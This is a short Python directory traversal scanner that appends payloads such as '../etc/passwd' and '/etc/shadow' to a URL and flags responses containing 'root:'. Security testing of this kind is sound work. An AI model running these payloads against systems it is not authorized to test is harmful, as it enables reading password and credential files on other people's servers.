import requests

def scan_directory_traversal(url):
    traversal_payloads = [
        "../etc/passwd",                      # Basic traversal
        "../../../../../etc/passwd",          # Deep traversal
        "/../../../../../../etc/shadow",      # Shadow file extraction
        "../../../../../../windows/system.ini", # Windows file traversal
        "../../../../../../boot.ini",         # Windows boot file
    ]
    
    results = []
    
    for payload in traversal_payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if "root:" in response.text:
                results.append(f"Directory Traversal Vulnerability Found: {test_url}")
        except requests.exceptions.RequestException as e:
            results.append(f"Error scanning {url}: {str(e)}")
    
    if not results:
        return "No Directory Traversal vulnerabilities found."
    
    return results
